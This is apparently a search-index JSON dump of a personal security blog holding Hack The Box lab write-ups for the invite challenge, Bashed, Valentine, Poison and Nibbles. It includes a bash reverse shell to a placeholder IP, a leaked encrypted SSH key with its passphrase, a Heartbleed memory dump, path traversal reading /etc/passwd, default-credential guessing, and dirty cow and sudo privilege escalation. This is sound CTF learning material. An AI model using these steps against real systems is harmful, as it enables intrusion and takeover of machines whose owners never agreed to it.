{
    "docs": [
        {
            "location": "/", 
            "text": "Introduction\n\n\nHi there!\n\n\nI'm a person interested in information security, currently working as Security Researcher at Onapsis.\nI'm also fan of CTF's, specially when challenges about crypto and reversing are present.\n\n\nThis is the way I found to share the little things I do in my spare time, such as tools, CTF write ups, researches, etc.i\nHope you enjoy it!\n\n\n@lmkalg", 
            "title": "Home"
        }, 
        {
            "location": "/#introduction", 
            "text": "Hi there!  I'm a person interested in information security, currently working as Security Researcher at Onapsis.\nI'm also fan of CTF's, specially when challenges about crypto and reversing are present.  This is the way I found to share the little things I do in my spare time, such as tools, CTF write ups, researches, etc.i\nHope you enjoy it!  @lmkalg", 
            "title": "Introduction"
        }, 
        {
            "location": "/ctfs/hackthebox/registration/", 
            "text": "Registration\n\n\nIn order to join to the platform, you should solve the first challenge.\n\n\nOnce in the \nJOIN\n section, open we are asked to prompt a code. We don't have any code yet, so the first step is to look into the page source to find something. After a digging some time, you will find a link to a JS script: \n/js/inviteapi.min.js\n. After openning and formating it:\n\n\n\neval(\n    function  (p,a,c,k,e,d){\n        e = function(c){return c.toString(36)};\n        if ( !''.replace(/^/,String)){\n            while(c--){\n                d[c.toString(a)] = k[c] || c.toString(a)\n            }\n            k = [function(e){return d[e]}];\n            e = function(){return'\\\\w+'};\n            c = 1\n        };\n        while(c--){\n            if (k[c]){\n                p = p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c])\n            }\n        }\n        return p    \n    }\n    ('1 i(4){h 8={\n4\n:4};$.9({a:\n7\n,5:\n6\n,g:8,b:\\'/d/e/n\\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:\n7\n,5:\n6\n,b:\\'/d/e/k/l/m\\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',\n    24,\n    24,\n    'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),\n    0,\n    {}\n    )\n)\n\n\n\n\n\nSo basically, it's a JS functiont that it's being called with some specific parameters.\n\n\nIt's not necessary to fully understand the whole thing, we can just use the Chrome/Firefox JS console and make use of this code. Nevertheless, if you copy \n paste it, it won't work due to a name for the function is missing. What I did was just to choose some name, copy only the part of the function definition an afterwards call it with the specific parameters:\n\n\n\n\nThe answer gathered is again JS code:\n\n\n\nfunction verifyInviteCode(code){\n    var formData = {\ncode\n:code};\n    $.ajax({\n        type:\nPOST\n,\n        dataType:\njson\n,\n        data:formData,url:'/api/invite/verify',\n        success:function(response){\n            console.log(response)\n        },\n        error:function(response){\n            console.log(response)\n        }\n    })\n}\n\nfunction makeInviteCode(){\n    $.ajax({\n        type:\nPOST\n,\n        dataType:\njson\n,\n        url:'/api/invite/how/to/generate',\n        success:function(response){\n            console.log(response)\n        },\n        error:function(response){\n            console.log(response)\n        }\n    })\n}\n\n\n\n\n\nThis time seems to show us how the \nInviteCode\n related functions are invoked... Time to use \nburp\n:\n\n\nIssuing the following POST we will receive an answer with some information encoded: \n\n\n\nPOST /api/invite/how/to/generate HTTP/1.1\nHost: www.hackthebox.eu\nConnection: close\nAccept: */*\n\n\n\n\n\n\n{\nsuccess\n:1,\ndata\n:{\ndata\n:\nSW4gb3JkZXIgdG8gZ2VuZXJhdGUgdGhlIGludml0ZSBjb2RlLCBtYWtlIGEgUE9TVCByZXF1ZXN0IHRvIC9hcGkvaW52aXRlL2dlbmVyYXRl\n,\nenctype\n:\nBASE64\n},\n0\n:200}\n\n\n\n\n\nAfter decoding the value inside \ndata\n which is encoded with the encoding mentioned in \nenctype\n, you'll get the a message saying:\n\nIn order to generate the invite code, make a POST request to /api/invite/generate\n\n\nSo, let folow their order:\n\n\n\nPOST /api/invite/generate HTTP/1.1\nHost: www.hackthebox.eu\nConnection: close\nAccept: */*\n\n\n\n\n\n\n{\nsuccess\n:1,\ndata\n:{\ncode\n:\nWElLQVktWFlFWk8tTkpaTEotVVNFQVMtWkJBTE4=\n,\nformat\n:\nencoded\n},\n0\n:200}\n\n\n\n\n\nAnd here it is.. Our \ncode\n is encoded in base64. Once decoded you'll get your code:\n\n\nXIKAY-XYEZO-NJZLJ-USEAS-ZBALN\n (in my case).\n\n\nDisclaimer\n\n\nI did the challenge again for the write up because I forgot to do it the first time.\nThis time, the code worked perfectly once I typed it. But the first time I did the challenge I remember that I wasn't able to use the code retrieved, and some error saying something about \"This IP can't use the code\" was triggered. I solved it just connecting through a VPN.", 
            "title": "Initial registration to HTB"
        }, 
        {
            "location": "/ctfs/hackthebox/registration/#registration", 
            "text": "In order to join to the platform, you should solve the first challenge.  Once in the  JOIN  section, open we are asked to prompt a code. We don't have any code yet, so the first step is to look into the page source to find something. After a digging some time, you will find a link to a JS script:  /js/inviteapi.min.js . After openning and formating it:  \neval(\n    function  (p,a,c,k,e,d){\n        e = function(c){return c.toString(36)};\n        if ( !''.replace(/^/,String)){\n            while(c--){\n                d[c.toString(a)] = k[c] || c.toString(a)\n            }\n            k = [function(e){return d[e]}];\n            e = function(){return'\\\\w+'};\n            c = 1\n        };\n        while(c--){\n            if (k[c]){\n                p = p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c])\n            }\n        }\n        return p    \n    }\n    ('1 i(4){h 8={ 4 :4};$.9({a: 7 ,5: 6 ,g:8,b:\\'/d/e/n\\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a: 7 ,5: 6 ,b:\\'/d/e/k/l/m\\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',\n    24,\n    24,\n    'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),\n    0,\n    {}\n    )\n)  So basically, it's a JS functiont that it's being called with some specific parameters.  It's not necessary to fully understand the whole thing, we can just use the Chrome/Firefox JS console and make use of this code. Nevertheless, if you copy   paste it, it won't work due to a name for the function is missing. What I did was just to choose some name, copy only the part of the function definition an afterwards call it with the specific parameters:   The answer gathered is again JS code:  \nfunction verifyInviteCode(code){\n    var formData = { code :code};\n    $.ajax({\n        type: POST ,\n        dataType: json ,\n        data:formData,url:'/api/invite/verify',\n        success:function(response){\n            console.log(response)\n        },\n        error:function(response){\n            console.log(response)\n        }\n    })\n}\n\nfunction makeInviteCode(){\n    $.ajax({\n        type: POST ,\n        dataType: json ,\n        url:'/api/invite/how/to/generate',\n        success:function(response){\n            console.log(response)\n        },\n        error:function(response){\n            console.log(response)\n        }\n    })\n}  This time seems to show us how the  InviteCode  related functions are invoked... Time to use  burp :  Issuing the following POST we will receive an answer with some information encoded:   \nPOST /api/invite/how/to/generate HTTP/1.1\nHost: www.hackthebox.eu\nConnection: close\nAccept: */*  \n{ success :1, data :{ data : SW4gb3JkZXIgdG8gZ2VuZXJhdGUgdGhlIGludml0ZSBjb2RlLCBtYWtlIGEgUE9TVCByZXF1ZXN0IHRvIC9hcGkvaW52aXRlL2dlbmVyYXRl , enctype : BASE64 }, 0 :200}  After decoding the value inside  data  which is encoded with the encoding mentioned in  enctype , you'll get the a message saying: In order to generate the invite code, make a POST request to /api/invite/generate  So, let folow their order:  \nPOST /api/invite/generate HTTP/1.1\nHost: www.hackthebox.eu\nConnection: close\nAccept: */*  \n{ success :1, data :{ code : WElLQVktWFlFWk8tTkpaTEotVVNFQVMtWkJBTE4= , format : encoded }, 0 :200}  And here it is.. Our  code  is encoded in base64. Once decoded you'll get your code:  XIKAY-XYEZO-NJZLJ-USEAS-ZBALN  (in my case).", 
            "title": "Registration"
        }, 
        {
            "location": "/ctfs/hackthebox/registration/#disclaimer", 
            "text": "I did the challenge again for the write up because I forgot to do it the first time.\nThis time, the code worked perfectly once I typed it. But the first time I did the challenge I remember that I wasn't able to use the code retrieved, and some error saying something about \"This IP can't use the code\" was triggered. I solved it just connecting through a VPN.", 
            "title": "Disclaimer"
        }, 
        {
            "location": "/ctfs/hackthebox/bashed/", 
            "text": "Bashed\n\n\nUser\n\n\nThis machine was pretty easy.\nFirst of all I used \ndirb\n to start listing some common directories.\n\n\n\ndirb http://10.10.10.68 common.txt\n\n\n\n\n\nSome directories were found:\n\n\n\n\nThe \ndev\n seemed to be the most interesting one, therefore I started from there:\n\n\n\n\nAnd once inside \nphpbash.php\n:\n\n\n\n\nRoot\n\n\nTBD", 
            "title": "Bashed"
        }, 
        {
            "location": "/ctfs/hackthebox/bashed/#bashed", 
            "text": "", 
            "title": "Bashed"
        }, 
        {
            "location": "/ctfs/hackthebox/bashed/#user", 
            "text": "This machine was pretty easy.\nFirst of all I used  dirb  to start listing some common directories.  \ndirb http://10.10.10.68 common.txt  Some directories were found:   The  dev  seemed to be the most interesting one, therefore I started from there:   And once inside  phpbash.php :", 
            "title": "User"
        }, 
        {
            "location": "/ctfs/hackthebox/bashed/#root", 
            "text": "TBD", 
            "title": "Root"
        }, 
        {
            "location": "/ctfs/hackthebox/valentine/", 
            "text": "Valentine (User \n root)\n\n\nUser\n\n\nSo, in order to start, as always, I used \nnmap\n:\n\n\n\n\nSSH\n, \nHTTP\n, \nHTTPS\n. Let's navigate the web servers while we wait for \ndirb\n again.\n\n\nThe index of both webservers is an image of a woman like shouting and the logo of \nheartbleed\n:\n\n\n\n\nFrom last machine I learn that inside \n/dev/\n something could appear. Let's try...:\n\n\n\n\nWell, that was lucky. Inside the \nnotes.txt\n there isn't anything interesting, but inside \nhype_key\n, there is some \nencoded\n text. Seems to be printable hex, so let's try to decode it: \nhex to ascii\n\n\n-----BEGIN RSA PRIVATE KEY-----\nProc-Type: 4,ENCRYPTED\nDEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46\n\nDbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R\n5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6\n0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi\nEbw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P\nOXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd\npHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH\nQdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E\np0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC\nOl6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO\nt9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5\nXqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK\naAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ\n+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E\nAloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q\nr08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe\n2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky\ne1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP\n09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC\ndYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX\ncY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY\npnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj\nMslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL\nsuLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW\nl0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT\nRUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3\n-----END RSA PRIVATE KEY-----\n\n\n\n\n\nNice! We have a private key... but what for? Maybe to login by \nssh\n? We still need the passphrase for it... \nI was expecting that \ndirb\n helped me with the output, but .. unfortunately, it didn't helped me. There were some \nphp\n scrips that seemed to encode/decode base64, but nothing else (well, it has the \n/dev\n directory):\n\n\n\n\nThen, I remembered that there was also an HTTPS server and due to the fact that this image is showing us the logo of hearbleed... maybe we can use the heartbleed exploit to gather information from there?\nTo perform this part I used \nMetasploit\n because it already had a \nmodule\n to do it. The usage was pretty straighforward, and after a couple of seconds I had some memory samples:\n\n\n\n\n\n\nAfter analzing these samples, I found a very interesting thing. There was an HTTP request there:\n\n\n\n\nIt was using one the \n.php\n scripts that we found thanks to \ndirb\n, which was \ndecode.php\n.. Let's try to decode it:\n\n\n\n\nYEAH!\n seems we have something usefull here. We have an RSA Private key and now we have something that seems to be a passphrase, but..how can we ensure that this is the correct passphrase?\n\n\nIn order to ensure it, I issued the following command\n\n\nssh-keygen -y -f rsa_key.pem\n\n\n\n\nwith \nrsa_key.pem\n being the private RSA key.  This command will extract the publick key from the PEM, only if we have the correct passphrase. You, after executing it, and typing the passphrase \nheartbleedbelievethehype\n the public key was successfully created.\n\n\nSo far we have the PEM and the passphrase for it. My main idea is that this should be used to connect to the server via \nSSH\n. But still, we don't know the user. I spent a \nLOOOONGG\n time thinking that I wasn't issuing a right command to connect using the PEM, but the problem was not the command but the user. I thought that \nvalentine\n had to be the correct one. After a couple of hours (yes, hours) I realize that maybe the user wasn't that one...\n\n\nI spent lot of time trying to find the correct user:\n\n\n\n\nLooking on new samples of memory gathered by exploiting heartbleed.\n\n\nLooking in the page source code of the pages hosted in the HTTP Server.\n\n\nTrying with common users (guest, www-data, etc).\n\n\nAmong others.\n\n\n\n\nFinally, two of my neurons did synapsis and I realized that the file where I found the encoded RSA private key, was called \nhype_key\n. So I literally ran to type the following command, which \nfortunately\n gave me access to the machine.\n\n\nssh -v -i rsa_key.pem hype@10.10.10.79\n\n\n\n\nOnce inside, it was just needed to go to the home directory of this user, and find the \nuser.txt\n file with the hash inside.\n\n\nRoot\n\n\nI copied the \nLinEnum.sh\n file to the vm, and made a scan but the path finally wasn't that one.\nI wanted to know the Kerknel version so figure it out if there was some exploit for it. then I issued the command:\n\n\nuname -a \nLinux Valentine 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux\n\n\n\n\nSo yeah, the Kernel seemed to be pretty old. I tried with 4 different exploits, two related with the vulnerability on \nperf_swevent_init\n and other two related to \ndity cow\n. Unfortunately, there didn't work (don't know why, specially the latest).\n\n\nFinally, I found some \nvideo\n explaining how to use a variant of \ndirty cow\n to modify the \n/etc/passwd/\n file in order to create a new user with id 0 (root privileges). \nExploit\n\n\nThe exploit was very straighforwad to use, the only thing I had to change was the value of the salt, for my current user. Afterwards, I was able to run the script. Once it was running, I connected to the system with another shell using the new username and the password that was asked me to set.", 
            "title": "Valentine"
        }, 
        {
            "location": "/ctfs/hackthebox/valentine/#valentine-user-root", 
            "text": "", 
            "title": "Valentine (User &amp; root)"
        }, 
        {
            "location": "/ctfs/hackthebox/valentine/#user", 
            "text": "So, in order to start, as always, I used  nmap :   SSH ,  HTTP ,  HTTPS . Let's navigate the web servers while we wait for  dirb  again.  The index of both webservers is an image of a woman like shouting and the logo of  heartbleed :   From last machine I learn that inside  /dev/  something could appear. Let's try...:   Well, that was lucky. Inside the  notes.txt  there isn't anything interesting, but inside  hype_key , there is some  encoded  text. Seems to be printable hex, so let's try to decode it:  hex to ascii  -----BEGIN RSA PRIVATE KEY-----\nProc-Type: 4,ENCRYPTED\nDEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46\n\nDbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R\n5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6\n0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi\nEbw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P\nOXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd\npHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH\nQdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E\np0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC\nOl6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO\nt9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5\nXqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK\naAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ\n+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E\nAloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q\nr08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe\n2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky\ne1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP\n09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC\ndYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX\ncY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY\npnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj\nMslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL\nsuLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW\nl0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT\nRUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3\n-----END RSA PRIVATE KEY-----  Nice! We have a private key... but what for? Maybe to login by  ssh ? We still need the passphrase for it... \nI was expecting that  dirb  helped me with the output, but .. unfortunately, it didn't helped me. There were some  php  scrips that seemed to encode/decode base64, but nothing else (well, it has the  /dev  directory):   Then, I remembered that there was also an HTTPS server and due to the fact that this image is showing us the logo of hearbleed... maybe we can use the heartbleed exploit to gather information from there?\nTo perform this part I used  Metasploit  because it already had a  module  to do it. The usage was pretty straighforward, and after a couple of seconds I had some memory samples:    After analzing these samples, I found a very interesting thing. There was an HTTP request there:   It was using one the  .php  scripts that we found thanks to  dirb , which was  decode.php .. Let's try to decode it:   YEAH!  seems we have something usefull here. We have an RSA Private key and now we have something that seems to be a passphrase, but..how can we ensure that this is the correct passphrase?  In order to ensure it, I issued the following command  ssh-keygen -y -f rsa_key.pem  with  rsa_key.pem  being the private RSA key.  This command will extract the publick key from the PEM, only if we have the correct passphrase. You, after executing it, and typing the passphrase  heartbleedbelievethehype  the public key was successfully created.  So far we have the PEM and the passphrase for it. My main idea is that this should be used to connect to the server via  SSH . But still, we don't know the user. I spent a  LOOOONGG  time thinking that I wasn't issuing a right command to connect using the PEM, but the problem was not the command but the user. I thought that  valentine  had to be the correct one. After a couple of hours (yes, hours) I realize that maybe the user wasn't that one...  I spent lot of time trying to find the correct user:   Looking on new samples of memory gathered by exploiting heartbleed.  Looking in the page source code of the pages hosted in the HTTP Server.  Trying with common users (guest, www-data, etc).  Among others.   Finally, two of my neurons did synapsis and I realized that the file where I found the encoded RSA private key, was called  hype_key . So I literally ran to type the following command, which  fortunately  gave me access to the machine.  ssh -v -i rsa_key.pem hype@10.10.10.79  Once inside, it was just needed to go to the home directory of this user, and find the  user.txt  file with the hash inside.", 
            "title": "User"
        }, 
        {
            "location": "/ctfs/hackthebox/valentine/#root", 
            "text": "I copied the  LinEnum.sh  file to the vm, and made a scan but the path finally wasn't that one.\nI wanted to know the Kerknel version so figure it out if there was some exploit for it. then I issued the command:  uname -a \nLinux Valentine 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux  So yeah, the Kernel seemed to be pretty old. I tried with 4 different exploits, two related with the vulnerability on  perf_swevent_init  and other two related to  dity cow . Unfortunately, there didn't work (don't know why, specially the latest).  Finally, I found some  video  explaining how to use a variant of  dirty cow  to modify the  /etc/passwd/  file in order to create a new user with id 0 (root privileges).  Exploit  The exploit was very straighforwad to use, the only thing I had to change was the value of the salt, for my current user. Afterwards, I was able to run the script. Once it was running, I connected to the system with another shell using the new username and the password that was asked me to set.", 
            "title": "Root"
        }, 
        {
            "location": "/ctfs/hackthebox/poison/", 
            "text": "Poison\n\n\nUser\n\n\nSo, started with the usual nmap command: \n\n\n\nWe have a lot of things to attack. Let's start with the http. \n\n\nFirst page ask you to choose one script.. Let's took \nlistfiles.php\n...\n\n\n\n\n\n\nThe answer back is an Array object with each file that is inside that folder.. If we pay attention there is one called \npwdbackup.txt\n. I'd like to read it.. so.. what happens if we change the file param of the url? \n\n\n\n\nGreat... Now.. encoded at least 13 times, pretty easy to noticed that the encode is base64, so let's decoded. I developed a very simple script:\n\n\nimport base64 \n\npassword = \nVm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVUbGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBSbVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVWM040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRsWmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYyeG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01GWkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYwMXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVaT1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5kWFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZkWGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZTVm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZzWkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBWVmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpOUkd4RVdub3dPVU5uUFQwSwo=\n\n\nfor _ in xrange(13):\n    password = base64.decodestring(password)\n\nprint password\n\n\n\n\nOnce executed.. the answer is: \nCharix!2#4%6\n8(0\n.\nOk maybe this could be a password for something.. maybe ssh, maybe vnc? Anyways, we are missing the user. How could we get the user?. \nWhat if we use again the path traversal vuln?:\n\n\n\n\nPerfect. There is a user called \ncharix\n, due to the password has also that string, I guess is the correct user for our password.\nLet's try an ssh connection: \n\n\n\n\nRoot\n\n\nOk, once I started using \nLinEnum.sh\n, looking for filesystem files, doing enumeration basically. The first thing, is the \nsecret.zip\n file which is placed in the home of charix. \n\n\nI copied to my local machine and tried to bruteforce it with JTR, but no luck at all. Then I tried to use the same password as the user of charix and worked!. Anyways, the file is very strange, is just ascii text maybe encoded or encrypted or corrupted. At this moment I thought it was just a troll. \n\n\nThen, I continued enumerating and discovered some processes running as root listeining only in localhost: \n\n\n\n\nIn particular, \nXvnc\n and \nsendmail\n sound weird for me to be running as root. Due to I didn't have any idea of what sendmail was, I started looking for vnc. \n\n\nSo I looked for some commands in the machine (just pressing vnc\n) and found \nvncpasswd\n. Once I ran it, a message telling me which password file was using appeared. So I went to look for that file, and get the following:\n\n\n\n\nSo, after \"catting\" I realise that was more or less the same format as the file that I already decompressed from the ZIP. \nSo then I went to the internet to try to see if this format was already broken or if there was some tool to let you read the password in plain text from this file. And... yes! there was \none\n.\n\n\nAfter using it, get the password \nVNCP@$$!\n.\n\n\nThis probably is the password of root (or toor, there are two users with id 0). I tried them first with ssh, but it didn't work. Clearly, was the VNC password, but I had to test it anyways.\n\n\nAt this moment I totally forgot that my nmap had discovered a VNC open port, so I spend more than an hour trying to figure it out how how to initiate a connection from the machine itself to this server that was only listening in the localhost. Finally, I did something different. I used ssh, to make a port forwarding from my local machine to a port of the local port 5901 of the remote machine, by ussing the following command:\n\n\nssh -L 5901:127.0.0.1:5901 -N -f -l Charix 10.10.10.84\n\n\n\n\nOnce I made that connection, using remmina, the root user and the password found, I was able to get the flag: \n\n\n\n\n\nYEAH! I had to copy it char by char xD.\n\n\nNibbles (User \n Rooted)\n\n\nUser\n\n\nReading comments. Found\n\n\n!-- /nibbleblog/ directory. Nothing interesting here! --\n\n\n\n\n\nRan dirbuster against http://10.10.10.75/nibbleblog/ \nFound \nadmin.php\n.\n\n\nTried with some default credentials:\n\n\n\n\nadmin:admin\n\n\nnibbles:nibbles\n\n\nadmin:nibbles \n(GOT IT!)\n\n\n\n\nTried to look for a LFI in some upload of images (new page, new post) without luck..\n\n\nSearch in google for nibbleblog: \nIt is a well-known CMS!\n.. Looking for exploit: YEAH! INside \nMSF\n.\n\n\nRun the exploit:\n\n\n\n\nOnce with the meterpreter.\n\n\ncat /etc/passsd\n\n\n\n\nShowed me, that there was only one user interesting called \nnibbler\n.\n\n\nwhoami\n\n\n\n\nreturned also \nnibbler\n.\n\n\nWent to /home/nibbler and...:\n\n\n\nRoot\n\n\nSo, first step was to create a reverse shell.. In order to do that I did:\n\n\n On my local machine \n\n\nsudo ufw allow 3333\nnc -lnvp 3333\n\n\n\n\n On the remote machine\n\n\nbash -i\nbash -i \n /dev/tcp/IP/3333 0\n1\n\n\n\n\n\n\nOnce I have the reverse shell in my local pc, I \"upgraded\" to a full tty (I learned this trick by looking this \nvideo\n).\n\n\nSo next step was use the \nLinEnum.sh\n. I found it already in the vm, but othrwise uploading in it to the vm wouldn't be a problem at all (wget to some http server or some other way).\n\n\nOnce I ran it, one of the outputs was:\n\n\nUser nibbler may run the following commands on Nibbles:\n    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh\n\n[+] Possible sudo pwnage!\n-rwxrwxrwx 1 nibbler nibbler 21 May  1 19:01 /home/nibbler/personal/stuff/monitor.sh\n\n\n\n\nThis basicall means that there is a misconfiguration in the \n/etc/sudoers\n file which allows the user \nnibbler\n to execute any \nmonitor.sh\n as root, without prompting any password. So my next step was simply:\n\n\necho \ncat /root/root.txt\n \n /home/nibbler/personal/stuff/monitor.sh\nsudo /home/nibbler/personal/stuff/monitor.sh\n\n\n\n\nIt's extremely important to run the the sudo comand not with the relative path, but with the absolute one. Because that's how sudo works\n\n\nThe output was the flag =):", 
            "title": "Poison"
        }, 
        {
            "location": "/ctfs/hackthebox/poison/#poison", 
            "text": "", 
            "title": "Poison"
        }, 
        {
            "location": "/ctfs/hackthebox/poison/#user", 
